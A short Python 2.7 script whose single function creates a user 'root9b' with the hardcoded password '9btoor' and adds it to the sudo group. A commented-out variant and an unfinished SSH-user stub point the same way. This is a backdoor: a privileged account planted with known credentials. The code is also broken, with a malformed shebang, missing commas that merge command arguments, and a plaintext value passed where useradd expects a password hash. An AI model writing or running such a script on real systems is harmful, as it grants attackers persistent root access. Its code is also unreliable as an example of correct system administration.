#/usr/bin/python2.7

import subprocess

def addsudoer():
    subprocess.check_output(['/usr/sbin/useradd' '-m' '-p' '9btoor', 'root9b'])
###    subprocess.check_output(['/usr/sbin/useradd' '-m' '-p' '9btoor', '-s', '/bin/bash' 'root9b'])

    subprocess.check_output(['/usr/sbin/usermod', '-aG', 'sudo', 'root9b'])

#def add sshuser():


addsudoer()